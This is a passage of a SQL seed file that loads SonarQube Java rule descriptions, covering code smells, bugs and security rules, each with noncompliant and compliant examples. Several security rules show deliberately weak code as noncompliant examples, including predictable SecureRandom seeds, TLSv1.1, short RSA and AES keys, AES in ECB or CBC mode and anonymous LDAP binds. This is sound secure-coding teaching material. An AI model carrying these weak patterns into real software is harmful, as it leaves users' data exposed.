if (x == null || ! x instanceof MyClass) { ... } // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x instanceof MyClass) { ... }

if (! x instanceof MyClass) { ... }
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4248', 'Regex patterns should not be created needlessly', 'sonarqube', 'Code Smell', '<p>The <code>java.util.regex.Pattern.compile()</code> methods have a significant performance cost, and therefore should be used sensibly.</p>
<p>Moreover they are the only mechanism available to create instances of the Pattern class, which are necessary to do any pattern matching using
regular expressions. Unfortunately that can be hidden behind convenience methods like <code>String.matches()</code> or
<code>String.split()</code>.</p>
<p>It is therefore somewhat easy to inadvertently repeatedly compile the same regular expression at great performance cost with no valid reason.</p>
<p>This rule raises an issue when:</p>
<ul>
  <li> A <code>Pattern</code> is compiled from a <code>String</code> literal or constant and is not stored in a static final reference. </li>
  <li> <code>String.matches</code>, <code>String.split</code>, <code>String.replaceAll</code> or <code>String.replaceFirst</code> are invoked with a
  <code>String</code> literal or constant. In which case the code should be refactored to use a <code>java.util.regex.Pattern</code> while respecting
  the previous rule. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public void doingSomething(String stringToMatch) {
  Pattern regex = Pattern.compile("myRegex");  // Noncompliant
  Matcher matcher = regex.matcher("s");
  // ...
  if (stringToMatch.matches("myRegex2")) {  // Noncompliant
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private static final Pattern myRegex = Pattern.compile("myRegex");
private static final Pattern myRegex2 = Pattern.compile("myRegex2");

public void doingSomething(String stringToMatch) {
  Matcher matcher = myRegex.matcher("s");
  // ...
  if (myRegex2.matcher(stringToMatch).matches()) {
    // ...
  }
}
</pre>
<h2>Exceptions</h2>
<p><code>String.split</code> doesn''t create a regex when the string passed as argument meets either of these 2 conditions:</p>
<ul>
  <li> It is a one-char String and this character is not one of the RegEx''s meta characters ".$|()[{^?*+" </li>
  <li> It is a two-char String and the first char is the backslash and the second is not the ascii digit or ascii letter. </li>
</ul>
<p>In which case no issue will be raised.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4266', '"Stream.collect()" calls should not be redundant', 'sonarqube', 'Code Smell', '<p>When using the <code>Stream</code> API, call chains should be simplified as much as possible to improve readability and maintainability.</p>
<p>This rule raises an issue when one of the following substitution can be made:</p>
<table>
  <tbody>
    <tr>
      <th>Original</th>
      <th>Preferred</th>
    </tr>
    <tr>
      <td><code>stream.collect(counting())</code></td>
      <td><code>stream.count()</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(maxBy(comparator))</code></td>
      <td><code>stream.max(comparator)</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(minBy(comparator))</code></td>
      <td><code>stream.min(comparator)</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(mapping(mapper))</code></td>
      <td><code>stream.map(mapper).collect()</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(reducing(...))</code></td>
      <td><code>stream.reduce(...)</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(summingInt(mapper))</code></td>
      <td><code>stream.mapToInt(mapper).sum()</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(summingLong(mapper))</code></td>
      <td><code>stream.mapToLong(mapper).sum()</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(summingDouble(mapper))</code></td>
      <td><code>stream.mapToDouble(mapper).sum()</code></td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>
int count = stream.collect(counting());  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int count = stream.count();
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4274', 'Asserts should not be used to check the parameters of a public method', 'sonarqube', 'Code Smell', '<p>An <code>assert</code> is inappropriate for parameter validation because assertions can be disabled at runtime in the JVM, meaning that a bad
operational setting would completely eliminate the intended checks. Further, <code>assert</code>s that fail throw <code>AssertionError</code>s, rather
than throwing some type of <code>Exception</code>. Throwing <code>Error</code>s is completely outside of the normal realm of expected
<code>catch</code>/<code>throw</code> behavior in normal programs.</p>
<p>This rule raises an issue when a <code>public</code> method uses one or more of its parameters with <code>assert</code>s.</p>
<h2>Noncompliant Code Example</h2>
<pre>
 public void setPrice(int price) {
  assert price &gt;= 0 &amp;&amp; price &lt;= MAX_PRICE;
  // Set the price
 }
</pre>
<h2>Compliant Solution</h2>
<pre>
 public void setPrice(int price) {
  if (price &lt; 0 || price &gt; MAX_PRICE) {
    throw new IllegalArgumentException("Invalid price: " + price);
  }
  // Set the price
 }
</pre>
<h2>See</h2>
<p><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/language/assert.html">Programming With Assertions</a></p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4275', 'Getters and setters should access the expected fields', 'sonarqube', 'Bug', '<p>Getters and setters provide a way to enforce encapsulation by providing <code>public</code> methods that give controlled access to
<code>private</code> fields. However in classes with multiple fields it is not unusual that copy and paste is used to quickly create the needed
getters and setters, which can result in the wrong field being accessed by a getter or setter.</p>
<p>This rule raises an issue in any of these cases:</p>
<ul>
  <li> A setter does not update the field with the corresponding name. </li>
  <li> A getter does not access the field with the corresponding name. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
class A {
  private int x;
  private int y;

  public void setX(int val) { // Noncompliant: field ''x'' is not updated
    this.y = val;
  }

  public int getY() { // Noncompliant: field ''y'' is not used in the return value
    return this.x;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class A {
  private int x;
  private int y;

  public void setX(int val) {
    this.x = val;
  }

  public int getY() {
    return this.y;
  }
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4276', 'Functional Interfaces should be as specialised as possible', 'sonarqube', 'Code Smell', '<p>The <code>java.util.function</code> package provides a large array of functional interface definitions for use in lambda expressions and method
references. In general it is recommended to use the more specialised form to avoid auto-boxing. For instance <code>IntFunction&lt;Foo&gt;</code>
should be preferred over <code>Function&lt;Integer, Foo&gt;</code>.</p>
<p>This rule raises an issue when any of the following substitution is possible:</p>
<table>
  <tbody>
    <tr>
      <th>Current Interface</th>
      <th>Preferred Interface</th>
    </tr>
    <tr>
      <td><code>Function&lt;Integer, R&gt;</code></td>
      <td><code>IntFunction&lt;R&gt;</code></td>
    </tr>
    <tr>
      <td><code>Function&lt;Long, R&gt;</code></td>
      <td><code>LongFunction&lt;R&gt;</code></td>
    </tr>
    <tr>
      <td><code>Function&lt;Double, R&gt;</code></td>
      <td><code>DoubleFunction&lt;R&gt;</code></td>
    </tr>
    <tr>
      <td><code>Function&lt;Double,Integer&gt;</code> </td>
      <td> <code>DoubleToIntFunction</code> </td>
    </tr>
    <tr>
      <td><code>Function&lt;Double,Long&gt;</code> </td>
      <td> <code>DoubleToLongFunction</code> </td>
    </tr>
    <tr>
      <td><code>Function&lt;Long,Double&gt;</code> </td>
      <td> <code>LongToDoubleFunction</code> </td>
    </tr>
    <tr>
      <td><code>Function&lt;Long,Integer&gt;</code> </td>
      <td> <code>LongToIntFunction</code></td>
    </tr>
    <tr>
      <td><code>Function&lt;R,Integer&gt;</code> </td>
      <td> <code>ToIntFunction&lt;R&gt;</code></td>
    </tr>
    <tr>
      <td><code>Function&lt;R,Long&gt;</code> </td>
      <td> <code>ToLongFunction&lt;R&gt;</code></td>
    </tr>
    <tr>
      <td><code>Function&lt;R,Double&gt;</code> </td>
      <td> <code>ToDoubleFunction&lt;R&gt;</code></td>
    </tr>
    <tr>
      <td><code>Function&lt;T,T&gt;</code> </td>
      <td> <code>UnaryOperator&lt;T&gt;</code> </td>
    </tr>
    <tr>
      <td><code>BiFunction&lt;T,T,T&gt;</code> </td>
      <td> <code>BinaryOperator&lt;T&gt;</code> </td>
    </tr>
    <tr>
      <td><code>Consumer&lt;Integer&gt;</code></td>
      <td><code>IntConsumer</code></td>
    </tr>
    <tr>
      <td><code>Consumer&lt;Double&gt;</code></td>
      <td><code>DoubleConsumer</code></td>
    </tr>
    <tr>
      <td><code>Consumer&lt;Long&gt;</code></td>
      <td><code>LongConsumer</code></td>
    </tr>
    <tr>
      <td><code>BiConsumer&lt;T,Integer&gt;</code> </td>
      <td> <code>ObjIntConsumer&lt;T&gt;</code></td>
    </tr>
    <tr>
      <td><code>BiConsumer&lt;T,Long&gt;</code> </td>
      <td> <code>ObjLongConsumer&lt;T&gt;</code></td>
    </tr>
    <tr>
      <td><code>BiConsumer&lt;T,Double&gt;</code> </td>
      <td> <code>ObjDoubleConsumer&lt;T&gt;</code></td>
    </tr>
    <tr>
      <td><code>Predicate&lt;Integer&gt;</code></td>
      <td><code>IntPredicate</code></td>
    </tr>
    <tr>
      <td><code>Predicate&lt;Double&gt;</code></td>
      <td><code>DoublePredicate</code></td>
    </tr>
    <tr>
      <td><code>Predicate&lt;Long&gt;</code></td>
      <td><code>LongPredicate</code></td>
    </tr>
    <tr>
      <td><code>Supplier&lt;Integer&gt;</code></td>
      <td><code>IntSupplier</code></td>
    </tr>
    <tr>
      <td><code>Supplier&lt;Double&gt;</code></td>
      <td><code>DoubleSupplier</code></td>
    </tr>
    <tr>
      <td><code>Supplier&lt;Long&gt;</code></td>
      <td><code>LongSupplier</code></td>
    </tr>
    <tr>
      <td><code>Supplier&lt;Boolean&gt;</code> </td>
      <td> <code>BooleanSupplier</code></td>
    </tr>
    <tr>
      <td><code>UnaryOperator&lt;Integer&gt;</code></td>
      <td><code>IntUnaryOperator</code></td>
    </tr>
    <tr>
      <td><code>UnaryOperator&lt;Double&gt;</code></td>
      <td><code>DoubleUnaryOperator</code></td>
    </tr>
    <tr>
      <td><code>UnaryOperator&lt;Long&gt;</code></td>
      <td><code>LongUnaryOperator</code></td>
    </tr>
    <tr>
      <td><code>BinaryOperator&lt;Integer&gt;</code> </td>
      <td> <code>IntBinaryOperator</code></td>
    </tr>
    <tr>
      <td><code>BinaryOperator&lt;Long&gt;</code> </td>
      <td> <code>LongBinaryOperator</code></td>
    </tr>
    <tr>
      <td><code>BinaryOperator&lt;Double&gt;</code> </td>
      <td> <code>DoubleBinaryOperator</code></td>
    </tr>
    <tr>
      <td><code>Function&lt;T, Boolean&gt;</code> </td>
      <td> <code>Predicate&lt;T&gt;</code></td>
    </tr>
    <tr>
      <td><code>BiFunction&lt;T,U,Boolean&gt;</code> </td>
      <td> <code>BiPredicate&lt;T,U&gt;</code></td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo implements Supplier&lt;Integer&gt; {  // Noncompliant
    @Override
    public Integer get() {
      // ...
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo implements IntSupplier {

  @Override
  public int getAsInt() {
    // ...
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4288', 'Spring components should use constructor injection', 'sonarqube', 'Code Smell', '<p>Spring <code>@Controller</code>, <code>@Service</code>, and <code>@Repository</code> classes are singletons by default, meaning only one instance
of the class is ever instantiated in the application. Typically such a class might have a few <code>static</code> members, such as a logger, but all
non-static members should be managed by Spring and supplied via constructor injection rather than by field injection.</p>
<p>This rule raise an issue when any non-<code>static</code> member of a Spring component has an injection annotation, or if the constructor of Spring
component does not have injection annotation.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Controller
public class HelloWorld {

  @Autowired
  private String name = null; // Noncompliant

  HelloWorld() {
   // ...
  }

  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Controller
public class HelloWorld {

  private String name = null;

  @Autowired
  HelloWorld(String name) {
    this.name = name;
   // ...
  }

  // ...
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4347', '"SecureRandom" seeds should not be predictable', 'sonarqube', 'Vulnerability', '<p>The <code>java.security.SecureRandom</code> class provides a strong random number generator (RNG) appropriate for cryptography. However, seeding it
with a constant or another predictable value will weaken it significantly. In general, it is much safer to rely on the seed provided by the
<code>SecureRandom</code> implementation.</p>
<p>This rule raises an issue when <code>SecureRandom.setSeed()</code> or <code>SecureRandom(byte[])</code> are called with a seed that is either
of:</p>
<ul>
  <li> a constant </li>
  <li> <code>System.currentTimeMillis()</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
SecureRandom sr = new SecureRandom();
sr.setSeed(123456L); // Noncompliant
int v = sr.next(32);

sr = new SecureRandom("abcdefghijklmnop".getBytes("us-ascii")); // Noncompliant
v = sr.next(32);
</pre>
<h2>Compliant Solution</h2>
<pre>
SecureRandom sr = new SecureRandom();
int v = sr.next(32);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/330.html">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/332.html">MITRE, CWE-332</a> - Insufficient Entropy in PRNG </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/336.html">MITRE, CWE-336</a> - Same Seed in Pseudo-Random Number Generator (PRNG) </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/337.html">MITRE, CWE-337</a> - Predictable Seed in Pseudo-Random Number Generator (PRNG) </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/MSC63-J.+Ensure+that+SecureRandom+is+properly+seeded">CERT, MSC63J.</a> - Ensure that
  SecureRandom is properly seeded </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4348', '"iterator" should not return "this"', 'sonarqube', 'Bug', '<p>There are two classes in the Java standard library that deal with iterations: <code>Iterable&lt;T&gt;</code> and <code>Iterator&lt;T&gt;</code>. An
<code>Iterable&lt;T&gt;</code> represents a data structure that can be the target of the "for-each loop" statement, and an
<code>Iterator&lt;T&gt;</code> represents the state of an ongoing traversal. An <code>Iterable&lt;T&gt;</code> is generally expected to support
multiple traversals.</p>
<p>An <code>Iterator&lt;T&gt;</code> that also implements <code>Iterable&lt;t&gt;</code> by returning itself as its <code>iterator()</code> will not
support multiple traversals since its state will be carried over.</p>
<p>This rule raises an issue when the <code>iterator()</code> method of a class implementing both <code>Iterable&lt;T&gt;</code> and
<code>Iterator&lt;t&gt;</code> returns <code>this</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class FooIterator implements Iterator&lt;Foo&gt;, Iterable&lt;Foo&gt; {
  private Foo[] seq;
  private int idx = 0;

  public boolean hasNext() {
    return idx &lt; seq.length;
  }

  public Foo next() {
    return seq[idx++];
  }

  public Iterator&lt;Foo&gt; iterator() {
    return this; // Noncompliant
  }
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class FooSequence implements Iterable&lt;Foo&gt; {
  private Foo[] seq;

  public Iterator&lt;Foo&gt; iterator() {
    return new Iterator&lt;Foo&gt;() {
      private int idx = 0;

      public boolean hasNext() {
        return idx &lt; seq.length;
      }

      public Foo next() {
        return seq[idx++];
      }
    };
  }
  // ...
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4349', '"write(byte[],int,int)" should be overridden', 'sonarqube', 'Code Smell', '<p>When directly subclassing <code>java.io.OutputStream</code> or <code>java.io.FilterOutputStream</code>, the only requirement is that you implement
the method <code>write(int)</code>. However most uses for such streams don''t write a single byte at a time and the default implementation for
<code>write(byte[],int,int)</code> will call <code>write(int)</code> for every single byte in the array which can create a lot of overhead and is
utterly inefficient. It is therefore strongly recommended that subclasses provide an efficient implementation of
<code>write(byte[],int,int)</code>.</p>
<p>This rule raises an issue when a direct subclass of <code>java.io.OutputStream</code> or <code>java.io.FilterOutputStream</code> doesn''t provide an
override of <code>write(byte[],int,int)</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyStream extends OutputStream { // Noncompliant
    private FileOutputStream fout;

    public MyStream(File file) throws IOException {
        fout = new FileOutputStream(file);
    }

    @Override
    public void write(int b) throws IOException {
        fout.write(b);
    }

    @Override
    public void close() throws IOException {
        fout.write("

".getBytes());
        fout.close();
        super.close();
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyStream extends OutputStream {
    private FileOutputStream fout;

    public MyStream(File file) throws IOException {
        fout = new FileOutputStream(file);
    }

    @Override
    public void write(int b) throws IOException {
        fout.write(b);
    }

    @Override
    public void write(byte[] b, int off, int len) throws IOException {
        fout.write(b, off, len);
    }

    @Override
    public void close() throws IOException {
        fout.write("

".getBytes());
        fout.close();
        super.close();
    }
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn''t raise an issue when the class is declared <code>abstract</code>.</p>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4351', '"compareTo" should not be overloaded', 'sonarqube', 'Bug', '<p>When implementing the <code>Comparable&lt;T&gt;.compareTo</code> method, the parameter''s type has to match the type used in the
<code>Comparable</code> declaration. When a different type is used this creates an overload instead of an override, which is unlikely to be the
intent.</p>
<p>This rule raises an issue when the parameter of the <code>compareTo</code> method of a class implementing <code>Comparable&lt;T&gt;</code> is not
same as the one used in the <code>Comparable</code> declaration.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo {
  static class Bar implements Comparable&lt;Bar&gt; {
    public int compareTo(Bar rhs) {
      return -1;
    }
  }

  static class FooBar extends Bar {
    public int compareTo(FooBar rhs) {  // Noncompliant: Parameter should be of type Bar
      return 0;
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo {
  static class Bar implements Comparable&lt;Bar&gt; {
    public int compareTo(Bar rhs) {
      return -1;
    }
  }

  static class FooBar extends Bar {
    public int compareTo(Bar rhs) {
      return 0;
    }
  }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4423', 'Weak SSL/TLS protocols should not be used', 'sonarqube', 'Vulnerability', '<p>This rule raises an issue when an insecure TLS protocol version is used (ie: a protocol different from "TLSv1.2", "TLSv1.3", "DTLSv1.2" or
"DTLSv1.3").</p>
<h2>Noncompliant Code Example</h2>
<p><code>javax.net.ssl.SSLContext</code> library:</p>
<pre>
context = SSLContext.getInstance("TLSv1.1"); // Noncompliant
</pre>
<p><a href="https://square.github.io/okhttp/">okhttp</a> library:</p>
<pre>
ConnectionSpec spec = new ConnectionSpec.Builder(ConnectionSpec.MODERN_TLS)
      .tlsVersions(TlsVersion.TLS_1_1) // Noncompliant
      .build();
</pre>
<h2>Compliant Solution</h2>
<p><code>javax.net.ssl.SSLContext</code> library:</p>
<pre>
context = SSLContext.getInstance("TLSv1.2"); // Compliant
</pre>
<p><a href="https://square.github.io/okhttp/">okhttp</a> library:</p>
<pre>
ConnectionSpec spec = new ConnectionSpec.Builder(ConnectionSpec.MODERN_TLS)
      .tlsVersions(TlsVersion.TLS_1_2) // Compliant
      .build();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/326.html">MITRE, CWE-327</a> - Inadequate Encryption Strength </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/327.html">MITRE, CWE-326</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href="https://blogs.oracle.com/java-platform-group/diagnosing-tls,-ssl,-and-https">Diagnosing TLS, SSL, and HTTPS</a> </li>
  <li> <a href="https://github.com/ssllabs/research/wiki/SSL-and-TLS-Deployment-Best-Practices#22-use-secure-protocols">SSL and TLS Deployment Best
  Practices - Use secure protocols</a> </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4425', '"Integer.toHexString" should not be used to build hexadecimal strings', 'sonarqube', 'Code Smell', '<p>Using <code>Integer.toHexString</code> is a common mistake when converting sequences of bytes into hexadecimal string representations. The problem
is that the method trims leading zeroes, which can lead to wrong conversions. For instance a two bytes value of <code>0x4508</code> would be converted
into <code>45</code> and <code>8</code> which once concatenated would give <code>0x458</code>.</p>
<p>This is particularly damaging when converting hash-codes and could lead to a security vulnerability.</p>
<p>This rule raises an issue when <code>Integer.toHexString</code> is used in any kind of string concatenations.</p>
<h2>Noncompliant Code Example</h2>
<pre>
MessageDigest md = MessageDigest.getInstance("SHA-256");
byte[] bytes = md.digest(password.getBytes("UTF-8"));

StringBuilder sb = new StringBuilder();
for (byte b : bytes) {
    sb.append(Integer.toHexString( b &amp; 0xFF )); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
MessageDigest md = MessageDigest.getInstance("SHA-256");
byte[] bytes = md.digest(password.getBytes("UTF-8"));

StringBuilder sb = new StringBuilder();
for (byte b : bytes) {
    sb.append(String.format("%02X", b));
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/704.html">MITRE, CWE-704</a> - Incorrect Type Conversion or Cast </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#BAD_HEXA_CONVERSION">BAD_HEXA_CONVERSION</a> </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4426', 'Cryptographic keys should be robust', 'sonarqube', 'Vulnerability', '<p>Most of cryptographic systems require a sufficient key size to be robust against brute-force attacks.</p>
<p><a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar2.pdf">NIST recommendations</a> will be checked for these
use-cases:</p>
<p><strong>Digital Signature Generation</strong> and <strong>Verification:</strong> </p>
<ul>
  <li> p ≥ 2048 AND q ≥ 224 for DSA (<code>p</code> is key length and <code>q</code> the modulus length) </li>
  <li> n ≥ 2048 for RSA (<code>n</code> is the key length) </li>
</ul>
<p><strong>Key Agreement</strong>: </p>
<ul>
  <li> p ≥ 2048 AND q ≥ 224 for DH and MQV </li>
  <li> n ≥ 224 for ECDH and ECMQV (Examples: <code>secp192r1</code> is a non-compliant curve (<code>n</code> &lt; 224) but <code>secp224k1</code> is
  compliant (<code>n</code> &gt;= 224)) </li>
</ul>
<p><strong>Symmetric keys</strong>: </p>
<ul>
  <li> key length ≥ 128 bits </li>
</ul>
<p>This rule will not raise issues for ciphers that are considered weak (no matter the key size) like <code>DES</code>, <code>Blowfish</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
KeyPairGenerator keyPairGen1 = KeyPairGenerator.getInstance("RSA");
keyPairGen1.initialize(1024); // Noncompliant

KeyPairGenerator keyPairGen5 = KeyPairGenerator.getInstance("EC");
ECGenParameterSpec ecSpec1 = new ECGenParameterSpec("secp112r1"); // Noncompliant
keyPairGen5.initialize(ecSpec1);

KeyGenerator keyGen1 = KeyGenerator.getInstance("AES");
keyGen1.init(64); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
KeyPairGenerator keyPairGen6 = KeyPairGenerator.getInstance("RSA");
keyPairGen6.initialize(2048); // Compliant

KeyPairGenerator keyPairGen5 = KeyPairGenerator.getInstance("EC");
ECGenParameterSpec ecSpec10 = new ECGenParameterSpec("secp256r1"); // compliant
keyPairGen5.initialize(ecSpec10);

KeyGenerator keyGen2 = KeyGenerator.getInstance("AES");
keyGen2.init(128); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf">NIST 800-131A</a> - Recommendation for Transitioning the
  Use of Cryptographic Algorithms and Key Lengths </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/326.html">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4432', 'AES encryption algorithm should be used with secured mode', 'sonarqube', 'Vulnerability', '<p>The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Some combinations are not secured:</p>
<ul>
  <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it does
  not hide data patterns well. In some senses, it doesn''t provide serious message confidentiality, and it is not recommended for use in cryptographic
  protocols at all. </li>
  <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>
</ul>
<p>In both cases, Galois/Counter Mode (GCM) with no padding should be preferred.</p>
<p>This rule raises an issue when a <code>Cipher</code> instance is created with either ECB or CBC/PKCS5Padding mode.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Cipher c1 = Cipher.getInstance("AES/ECB/NoPadding"); // Noncompliant
Cipher c2 = Cipher.getInstance("AES/CBC/PKCS5Padding"); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/327.html">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf">Recommendation for Block Cipher Modes of Operation</a>
  </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#ECB_MODE">ECB_MODE</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#PADDING_ORACLE">PADDING_ORACLE</a> </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href=''/coding_rules#rule_key=java%3AS5542''>S5542</a> instead.</p>', 'java', 'DEPRECATED', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4433', 'LDAP connections should be authenticated', 'sonarqube', 'Vulnerability', '<p>An LDAP client authenticates to an LDAP server with a "bind request" which provides, among other, a <a
href="https://ldapwiki.com/wiki/Simple%20Authentication">simple authentication method</a>.</p>
<p>Simple authentication in LDAP can be used with three different mechanisms:</p>
<ul>
  <li> <em>Anonymous Authentication Mechanism</em> by performing a bind request with a username and password value of zero length. </li>
  <li> <em>Unauthenticated Authentication Mechanism</em> by performing a bind request with a password value of zero length. </li>
  <li> <em>Name/Password Authentication Mechanism</em> by performing a bind request with a password value of non-zero length. </li>
</ul>
<p>Anonymous binds and unauthenticated binds allow access to information in the LDAP directory without providing a password, their use is therefore
strongly discouraged. </p>
<h2>Noncompliant Code Example</h2>
<p>This rule raises an issue when an LDAP connection is created with <code>Context.SECURITY_AUTHENTICATION</code> set to <code>"none"</code>.</p>
<pre>
// Set up the environment for creating the initial context
Hashtable&lt;String, Object&gt; env = new Hashtable&lt;String, Object&gt;();
env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
env.put(Context.PROVIDER_URL, "ldap://localhost:389/o=JNDITutorial");

// Use anonymous authentication
env.put(Context.SECURITY_AUTHENTICATION, "none"); // Noncompliant

// Create the initial context
DirContext ctx = new InitialDirContext(env);
</pre>
<h2>Compliant Solution</h2>
<pre>
// Set up the environment for creating the initial context
Hashtable&lt;String, Object&gt; env = new Hashtable&lt;String, Object&gt;();
env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
env.put(Context.PROVIDER_URL, "ldap://localhost:389/o=JNDITutorial");

// Use simple authentication
env.put(Context.SECURITY_AUTHENTICATION, "simple");
env.put(Context.SECURITY_PRINCIPAL, "cn=S. User, ou=NewHires, o=JNDITutorial");
env.put(Context.SECURITY_CREDENTIALS, getLDAPPassword());

// Create the initial context
